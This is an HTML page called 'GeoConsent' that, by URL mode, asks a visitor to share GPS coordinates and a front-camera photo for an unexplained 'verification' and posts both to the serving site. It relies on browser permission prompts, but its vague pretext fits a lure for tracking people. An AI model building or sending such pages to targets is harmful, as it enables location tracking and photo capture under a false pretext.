<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>GeoConsent</title>
</head>

<body style="font-family:sans-serif;text-align:center;padding:40px">

<h2 id="title">Verification</h2>
<p id="desc"></p>

<button id="gpsBtn" style="display:none" onclick="gps()">
ğŸ“ Share GPS
</button>

<br><br>

<button id="camBtn" style="display:none" onclick="camera()">
ğŸ“· Capture Camera
</button>

<p id="status"></p>

<video id="video" autoplay playsinline style="display:none;width:100%"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
window.onload = function () {
  const params = new URLSearchParams(window.location.search);
  const mode = params.get("mode");

  if (!mode) {
    document.getElementById("desc").innerText =
      "Invalid link (no mode)";
    return;
  }

  if (mode === "gps") {
    gpsBtn.style.display = "inline-block";
    title.innerText = "ğŸ“ GPS Verification";
  }

  if (mode === "camera") {
    camBtn.style.display = "inline-block";
    title.innerText = "ğŸ“· Camera Verification";
  }

  if (mode === "both") {
    gpsBtn.style.display = "inline-block";
    camBtn.style.display = "inline-block";
    title.innerText = "ğŸ“ GPS + Camera Verification";
  }
};

function gps() {
  navigator.geolocation.getCurrentPosition(pos => {
    fetch("/location", {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        lat:pos.coords.latitude,
        lon:pos.coords.longitude
      })
    });
    status.innerText = "âœ… GPS shared";
  }, () => alert("GPS denied"));
}

async function camera() {
  const stream = await navigator.mediaDevices.getUserMedia({
    video:{facingMode:"user"}
  });

  video.style.display = "block";
  video.srcObject = stream;

  setTimeout(() => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    const img = canvas.toDataURL("image/jpeg");
    stream.getTracks().forEach(t => t.stop());
    video.style.display = "none";

    fetch("/capture", {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({image:img})
    });

    status.innerText = "âœ… Photo captured";
  },2000);
}
</script>

</body>
</html>
